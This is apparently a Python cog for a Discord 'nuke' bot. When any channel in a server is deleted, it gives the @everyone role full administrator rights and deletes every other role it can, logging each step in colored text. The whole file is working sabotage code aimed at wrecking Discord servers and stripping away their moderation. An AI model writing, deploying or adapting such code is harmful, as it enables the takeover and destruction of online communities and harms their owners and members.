from discord.ext import commands
import discord
from colorama import Fore


class nukeDestroyChannel(commands.Cog):
	def __init__(self,client):
		self.client=client
		self.delOn=0
	
	@commands.Cog.listener()
	async def on_guild_channel_delete(self,channel):
		if self.delOn:None
		else:
			self.delOn=1
			for a in channel.guild.roles:
				if a.name == "@everyone":
					try:
						permissions = discord.Permissions()
						permissions.update(administrator = True)
						await a.edit(reason = None, permissions=permissions)
						print(f"{Fore.MAGENTA}[=] Given @everyone perms")
					except:print(f"{Fore.MAGENTA}[=] Cannot give @everyone perms")
				else:
					try:
						await a.delete()
						print(f"{Fore.LIGHTGREEN_EX}[+] Role deleted")
					except:
						print(f"{Fore.RED}[-] Role cannot be deleted")

async def setup(client):
	await client.add_cog(nukeDestroyChannel(client))